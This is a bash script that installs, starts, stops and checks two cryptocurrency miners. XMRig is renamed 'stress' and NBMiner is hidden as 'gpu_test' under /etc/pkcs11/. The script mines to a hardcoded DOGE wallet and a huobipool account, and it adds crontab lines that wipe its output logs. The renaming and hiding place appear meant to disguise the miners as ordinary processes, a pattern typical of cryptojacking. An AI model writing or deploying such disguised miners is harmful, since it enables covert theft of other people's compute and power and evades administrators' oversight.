#!/bin/bash

dogepid=`ps -ef | grep -v grep | grep stress | awk '{print $2}'`
ethpid=`ps -ef | grep -v grep | grep gpu | awk '{print $2}'`

function DogeInstall(){
    yum -y install wget && mkdir -pv /opt/src
    cd /opt/src && wget -c https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
    tar zxf xmrig-6.12.1-linux-x64.tar.gz && rm -rf xmrig-6.12.1-linux-x64.tar.gz
    mv xmrig-6.12.1 stress && cd stress && mv xmrig stress
}

function DogeStatus(){
    if [ -n "$dogepid" ]; then
        echo "Active: Doge is active (running)"
    else
        echo "Active: Doge is inactive (dead)"
    fi
}

function DogeStart(){
    cd /opt/src/stress
    ./stress -a rx -k -o rx.unmineable.com:13333 -u DOGE:DN8ejjCTkpkP6ZV8vfW5chHoMow4DTHtC8.doge -B -l /opt/src/stress/stress.log
    echo "00 */3 * * * root echo '' >/opt/src/stress/nohup.out" >> /etc/crontab
    # echo $dogepid
    DogeStatus
}

function DogeStop(){
    if [ -n "$dogepid" ]; then
        kill -9 $dogepid
    else
        echo "Active: Not active"
    fi
}

function EthInstall(){
    cd /etc/pkcs11/
    wget -c https://github.com/NebuTech/NBMiner/releases/download/v37.2/NBMiner_37.2_Linux.tgz
    tar zxf NBMiner_37.2_Linux.tgz && rm -rf NBMiner_37.2_Linux.tgz && mv NBMiner_Linux gpu_stress
    cd gpu_stress &&  mv nbminer gpu_test
}

function EthStatus(){
    if [ -n "$ethpid" ]; then
        echo "Active: active (running)"
    else
        echo "Active: inactive (dead)"
    fi
}

function EthStart(){
    cd /etc/pkcs11/gpu_stress && nohup ./gpu_test -a ethash -o stratum+tcp://en.huobipool.com:1800 -u dotpodminer.001 &
    echo "00 */1 * * * root echo '' > /etc/pkcs11/gpu_stress/nohup.out" >> /etc/crontab
    #sed -i '$a 00 \*\/1 \* \* \* echo \"\" \> \/etc\/pkcs11\/gpu_stress\/nohup.out' /etc/crontab
}

function EthStop(){
    if [ -n "$ethpid" ]; then
        # sed -i '$d' /etc/crontab
        kill -9 $ethpid
    else
        echo "Active: Not active"
    fi
}

if [[ -n "$1" && -n "$2" ]]; then
    if [ "$1" == "doge" ]; then
        if [ "$2" == "install" ]; then
            DogeInstall
        elif [ "$2" == "start" ]; then
            DogeStart
        elif [ "$2" == "stop" ]; then
            DogeStop
        elif [ "$2" == "status" ]; then
            DogeStatus
        else
            echo "Error: The second parameter must be install/start/status/status"
        fi
    elif [ "$1" == "eth" ]; then
        if [ "$2" == "install" ]; then
            EthInstall
        elif [ "$2" == "start" ]; then
            EthStart
        elif [ "$2" == "stop" ]; then
            EthStop
        elif [ "$2" == "status" ]; then
            EthStatus
        else
            echo "Error: The second parameter must be install/start/status/status"
        fi
    else
        echo 'Error: The first parameter must be "doge" or "eth"'
    fi
else
    echo "Input error, please enter to execute this script as required"
    echo "Error: This takes two parameters"
fi





